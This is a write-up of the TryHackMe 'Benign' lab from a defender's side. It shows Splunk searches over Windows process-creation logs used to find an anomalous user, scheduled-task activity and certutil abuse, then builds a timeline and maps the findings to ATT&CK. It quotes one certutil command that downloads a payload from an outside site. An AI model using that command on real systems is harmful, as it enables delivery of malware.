TryHackMe Benign -- SOC Investigation

Overview

This project documents my investigation of the TryHackMe Benign
challenge using Splunk and Windows event logs. The lab focused on
identifying suspicious process activity, anomalous user behavior,
scheduled-task activity, LOLBin abuse, payload delivery, and follow-on
activity.

Tools: Splunk, Windows Event Logs
Primary Event: Windows Security Event ID 4688 -- Process Creation
Skills: SPL, Windows Event Analysis, Threat Hunting, Command-Line
Analysis, LOLBin Analysis, Timeline Reconstruction

Note: This write-up focuses on the investigation methodology and
evidence rather than simply listing challenge answers.

Investigation Goals

Identify suspicious or anomalous user activity.

Analyze Windows process-creation events.

Investigate scheduled-task execution.

Identify abuse of legitimate Windows utilities.

Trace payload delivery.

Pivot from known suspicious activity to build an incident timeline.

1. Validating the Log Schema

One of the first lessons from this investigation was to inspect the raw
events before assuming field names. An initial search did not return the
expected results because the dataset used EventID rather than the
field name I initially expected.

Inspecting a raw event showed the useful fields included EventID,
UserName, HostName, ProcessName, and CommandLine.



Figure 1 -- Raw Event ID 4688 showing the fields available for process
analysis.

index=win_eventlogs EventID=4688
| stats count by UserName
| sort UserName

Takeaway

Before writing complex SPL, verify how the data is actually parsed.
Field names can differ between datasets and logging pipelines.

2. Identifying Anomalous User Activity

I used process-creation events to enumerate usernames and compare
observed accounts with the users expected in the environment. This
allowed me to identify an account that did not fit the expected user
baseline.



Figure 2 -- Identification of anomalous account activity during the
investigation.

An important distinction during this step was:

UserName = account executing the process

HostName = endpoint where the process executed

This matters because an account can execute activity on a workstation
belonging to another department.

3. Investigating Scheduled Tasks

I searched for executions of schtasks.exe, the built-in Windows
command-line utility for managing scheduled tasks.

index=win_eventlogs EventID=4688 ProcessName="*schtasks.exe"
| table _time HostName UserName ProcessName CommandLine
| sort _time



Figure 3 -- Process-creation activity involving schtasks.exe.

Scheduled tasks can be legitimate administrative activity, but attackers
also commonly abuse them for persistence and automated execution.
Context such as the user, host, command line, and surrounding events is
therefore critical.

4. Identifying LOLBin Abuse

The strongest suspicious activity involved certutil.exe. Certutil
is a legitimate Windows binary used for certificate-related operations.
However, its network functionality can also be abused to retrieve files,
making it a common example of a Living Off the Land Binary (LOLBin).

The process-creation event showed:

certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe



Figure 4 -- Event ID 4688 showing certutil.exe being used to
retrieve benign.exe.

The event provided several useful investigation pivots at once:
executing user, endpoint, process name, full command line, external
destination, downloaded filename, and timestamp.

5. Payload Identification

The downloaded payload was identified as benign.exe.



Figure 5 -- Payload identification during the TryHackMe
investigation.

Once the filename was known, it could be used as another indicator to
search across the dataset:

index=win_eventlogs "benign.exe"
| table _time HostName UserName ProcessName CommandLine
| sort _time

This is a useful threat-hunting technique: once one reliable indicator
is discovered, pivot on it to find related activity.

6. Building the Incident Timeline

After identifying a high-confidence suspicious event, I narrowed the
investigation to the affected host, user, and time period.

index=win_eventlogs HostName="HR_01" UserName="haroon"
earliest="03/04/2022:10:38:00" latest="03/04/2022:11:30:00"
| table _time EventID ProcessName CommandLine
| sort _time

Instead of treating each log as an isolated event, this allowed me to
think about the activity as a sequence:

Suspicious execution → Payload download → Payload execution →
Follow-on activity → C2 activity

Splunk Techniques Practiced

Technique                           Purpose

stats count by UserName           Establish a user baseline and
identify anomalies

table                             Reduce noise and display
investigation-relevant fields

sort _time                        Reconstruct activity
chronologically

EventID=4688                      Focus on Windows process-creation
events

Filename searches                   Pivot from discovered indicators

Process-name searches               Hunt for suspicious or dual-use
binaries

Potential MITRE ATT&CK Mapping

Observed Behavior                   Potential Technique

Downloading a payload with a        T1105 -- Ingress Tool Transfer
legitimate Windows utility

Scheduled-task activity             T1053.005 -- Scheduled Task/Job:
Scheduled Task

Command-line execution              T1059 -- Command and Scripting
Interpreter

These mappings are presented as investigative context; exact ATT&CK
classification depends on the supporting evidence available.

Key Takeaways

Inspect raw events before assuming field names.

Windows Event ID 4688 is highly valuable for process
investigations.

Command-line arguments often provide more context than the
executable name alone.

A legitimate Windows executable does not automatically indicate
legitimate behavior.

Understand the difference between the executing user and the
affected host.

Establishing a baseline makes anomalous accounts and processes
easier to identify.

Once a strong indicator is found, pivot using usernames, hosts,
processes, filenames, URLs, and timestamps.

Reconstructing a timeline is more valuable than examining individual
logs in isolation.

Analyst Reflection

This lab strengthened my ability to investigate Windows endpoint
activity using Splunk. I practiced analyzing Event ID 4688, validating
log fields, identifying anomalous user activity, investigating scheduled
tasks, recognizing LOLBin abuse, analyzing command-line arguments, and
pivoting from a suspicious event to related activity.

The biggest lesson was to approach the investigation as a chain of
evidence rather than a series of challenge questions. Once a
high-confidence suspicious event was identified, the user, host,
process, filename, URL, and timestamp became pivots for reconstructing
the rest of the activity.

Disclaimer

This investigation was completed in the authorized TryHackMe Benign
training environment for educational purposes.
